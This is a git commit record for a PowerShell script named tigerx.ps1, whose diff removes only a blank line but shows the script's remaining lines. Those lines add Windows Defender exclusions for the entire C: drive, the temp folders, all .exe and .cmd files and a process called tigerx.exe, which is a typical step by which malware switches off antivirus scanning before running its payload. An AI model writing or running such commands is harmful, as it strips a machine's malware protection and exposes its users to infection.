a9db6e747bf94050bf077f93945821aca5084c7b
Pctoolsbox.com <45397057+Pctoolsbox@users.noreply.github.com>
2024-12-09 14:57:27 +0200

    Update tigerx.ps1

--- tigerx.ps1
+++ tigerx.ps1
@@ -1,4 +1,3 @@
-
 Add-MpPreference -ExclusionPath "C:*","tigerx.exe","C:\Windows\Temp\",".cmd",".exe","$env:TEMP"
 add-mppreference -exclusionprocess $env:TEMP
 add-mppreference -exclusionprocess tigerx.exe
